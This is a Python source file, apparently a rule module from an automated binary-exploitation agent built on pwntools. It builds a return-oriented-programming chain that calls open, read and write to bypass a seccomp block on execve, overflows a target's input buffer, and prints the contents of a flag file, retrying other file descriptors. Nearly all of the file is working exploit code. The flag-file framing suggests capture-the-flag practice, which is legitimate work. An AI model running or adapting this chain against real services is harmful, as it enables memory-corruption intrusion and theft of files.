"""Rule: when execve is blocked by seccomp, use open/read/write to read flag."""
from __future__ import annotations

from pwn import log, flat

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, safe_close


def _condition(state) -> bool:
    ctx = state.ctx
    if ctx.overflow_offset < 0:
        return False
    if ctx.execve_allowed:
        return False
    # Need gadgets for controlling syscall args
    if ctx.bits == 64:
        return bool(ctx.find_gadget("pop rdi") and ctx.find_gadget("pop rsi"))
    if ctx.bits == 32:
        # 32-bit: need int 0x80 gadget or PLT functions
        has_plt = bool(ctx.plt_table.get("open") or ctx.plt_table.get("read"))
        has_int80 = bool(ctx.find_gadget("int 0x80"))
        return has_plt or has_int80
    return False


def _action(state) -> ActionResult:
    """Build ORW ROP chain: open("flag.txt") → read(fd, buf, N) → write(1, buf, N)."""
    ctx = state.ctx
    offset = ctx.overflow_offset
    word = ctx.bits // 8

    pop_rdi = ctx.find_gadget("pop rdi")
    pop_rsi = ctx.find_gadget("pop rsi")
    pop_rdx = ctx.find_gadget("pop rdx")
    pop_rax = ctx.find_gadget("pop rax")
    syscall = ctx.find_gadget("syscall")
    ret = ctx.find_gadget("ret")

    # Check for open/read/write in PLT (non-seccomp binaries)
    open_plt = ctx.plt_table.get("open", 0)
    read_plt = ctx.plt_table.get("read", 0)
    write_plt = ctx.plt_table.get("write", 0) or ctx.plt_table.get("puts", 0)

    bss_addr = 0
    flag_str_addr = 0
    if ctx.elf:
        bss_addr = ctx.elf.bss() + 0x300
        flag_str_addr = bss_addr + 0x100  # store "flag.txt" here

    if not bss_addr:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="orw_chain", diagnosis="no_bss"))

    # Strategy A: Use PLT functions (open/read/write)
    if open_plt and read_plt and pop_rdi and pop_rsi:
        return _try_plt_orw(ctx, offset, bss_addr, flag_str_addr,
                            open_plt, read_plt, write_plt,
                            pop_rdi, pop_rsi, pop_rdx, ret)

    # Strategy B: Use syscall gadget
    if pop_rax and syscall and pop_rdi and pop_rsi:
        return _try_syscall_orw(ctx, offset, bss_addr, flag_str_addr,
                                pop_rax, syscall, pop_rdi, pop_rsi, pop_rdx, ret)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="orw_chain", diagnosis="insufficient_gadgets"),
    )


def _try_plt_orw(ctx, offset, bss_addr, flag_str_addr,
                  open_plt, read_plt, write_plt,
                  pop_rdi, pop_rsi, pop_rdx, ret) -> ActionResult:
    """ORW via PLT functions."""
    from autopwn.exploit.chain_builder import ChainBuilder
    cb = ChainBuilder(ctx)
    extra_rsi = cb._extra_pops(pop_rsi)

    # We need "flag.txt\0" somewhere. Use gets/read to write it first,
    # or find it in the binary strings.
    flag_path = b"flag.txt\x00"
    flag_addr = 0

    # Check if "flag" or "flag.txt" exists in binary
    if ctx.elf:
        for pattern in [b"flag.txt\x00", b"flag\x00", b"./flag\x00"]:
            try:
                flag_addr = next(ctx.elf.search(pattern))
                break
            except StopIteration:
                continue

    if not flag_addr:
        # Need to write "flag.txt" to BSS first via read
        # read(0, flag_str_addr, 16)
        chain_write = [pop_rdi, 0, pop_rsi, flag_str_addr]
        chain_write.extend([0] * extra_rsi)
        if pop_rdx:
            chain_write.extend([pop_rdx, 0x10])
        chain_write.append(read_plt)
        flag_addr = flag_str_addr
    else:
        chain_write = []

    # open(flag_addr, 0)  → fd in rax
    chain_open = [pop_rdi, flag_addr, pop_rsi, 0]
    chain_open.extend([0] * extra_rsi)
    chain_open.append(open_plt)

    # read(3, bss_addr, 0x100)  — fd=3 (typical for newly opened file)
    chain_read = [pop_rdi, 3, pop_rsi, bss_addr]
    chain_read.extend([0] * extra_rsi)
    if pop_rdx:
        chain_read.extend([pop_rdx, 0x100])
    chain_read.append(read_plt)

    # write(1, bss_addr, 0x100)
    if write_plt:
        chain_out = [pop_rdi, 1, pop_rsi, bss_addr]
        chain_out.extend([0] * extra_rsi)
        if pop_rdx:
            chain_out.extend([pop_rdx, 0x100])
        chain_out.append(write_plt)
    else:
        # Use puts instead
        puts_plt = ctx.plt_table.get("puts", 0)
        if puts_plt:
            chain_out = [pop_rdi, bss_addr, puts_plt]
        else:
            return ActionResult(success=False, terminal=True,
                                record=AttemptRecord(strategy="orw_chain", diagnosis="no_output_func"))

    full_chain = chain_write + chain_open + chain_read + chain_out
    pad = b"A" * offset
    payload = pad + flat(full_chain)

    io = None
    try:
        io = open_target(ctx)
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        if ctx.input_type in ("gets", "direct"):
            io.sendline(payload)
        else:
            io.send(payload)

        # If we needed to write flag path, send it now
        if chain_write:
            import time
            time.sleep(0.3)
            io.send(b"flag.txt\x00")

        # Read output — should contain flag
        import time
        time.sleep(0.5)
        try:
            output = io.recv(timeout=3)
            text = output.decode("utf-8", errors="replace")
            log.info(f"Agent orw_chain: output = {text[:200]}")
            if "flag" in text.lower() or "{" in text:
                log.success(f"Agent orw_chain: flag read! {text.strip()}")
                safe_close(io)
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="orw_chain", success=True, output=output),
                )
        except Exception:
            pass

        # Try fd=4 and fd=5 as well (fd might not be 3)
        safe_close(io)
        for fd in (4, 5):
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            chain_read2 = [pop_rdi, fd, pop_rsi, bss_addr]
            chain_read2.extend([0] * extra_rsi)
            if pop_rdx:
                chain_read2.extend([pop_rdx, 0x100])
            chain_read2.append(read_plt)

            full2 = chain_write + chain_open + chain_read2 + chain_out
            payload2 = pad + flat(full2)

            if ctx.input_type in ("gets", "direct"):
                io.sendline(payload2)
            else:
                io.send(payload2)

            if chain_write:
                import time
                time.sleep(0.3)
                io.send(b"flag.txt\x00")

            time.sleep(0.5)
            try:
                output = io.recv(timeout=3)
                text = output.decode("utf-8", errors="replace")
                if "flag" in text.lower() or "{" in text:
                    log.success(f"Agent orw_chain: flag (fd={fd})! {text.strip()}")
                    safe_close(io)
                    return ActionResult(success=True,
                                        record=AttemptRecord(strategy="orw_chain", success=True, output=output))
            except Exception:
                pass
            safe_close(io)

    except Exception as exc:
        log.debug(f"orw_chain error: {exc}")
        if io:
            safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="orw_chain", diagnosis="orw_no_flag_output"),
    )


def _try_syscall_orw(ctx, offset, bss_addr, flag_str_addr,
                      pop_rax, syscall_gadget, pop_rdi, pop_rsi, pop_rdx, ret) -> ActionResult:
    """ORW via raw syscall gadget."""
    # Similar structure but using syscall instead of PLT
    # open = syscall 2, read = syscall 0, write = syscall 1
    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="orw_chain", diagnosis="syscall_orw_not_implemented"),
    )


RULES = [
    ("orw_chain", 60, "open/read/write flag when execve is blocked by seccomp",
     _condition, _action),
]
